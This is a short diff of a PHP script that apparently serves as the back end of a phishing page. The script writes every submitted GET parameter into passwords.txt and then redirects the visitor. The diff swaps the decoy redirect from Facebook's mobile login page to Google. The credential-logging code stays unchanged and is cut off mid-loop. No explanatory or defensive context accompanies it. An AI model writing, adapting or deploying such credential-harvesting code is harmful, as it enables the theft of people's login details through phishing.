@@ -1,5 +1,5 @@
 :<?php
-header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
+header("Location: https://www.google.com/=");
 $handle = fopen("passwords.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
